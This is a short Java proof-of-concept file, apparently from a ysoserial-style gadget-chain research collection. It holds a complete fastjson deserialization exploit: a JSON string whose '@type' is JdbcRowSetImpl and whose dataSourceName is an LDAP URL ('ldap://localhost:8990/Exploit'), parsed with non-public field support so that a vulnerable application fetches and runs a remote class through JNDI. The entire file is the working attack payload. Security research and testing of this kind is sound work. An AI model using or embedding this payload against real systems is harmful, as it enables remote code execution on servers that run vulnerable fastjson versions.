package ysoserial.payloads.tabbyGadgetChains.Jdk8;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc3 {
    public static void main(String[] args) {
            String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:8990/Exploit\", \"autoCommit\":true}\n";
            JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
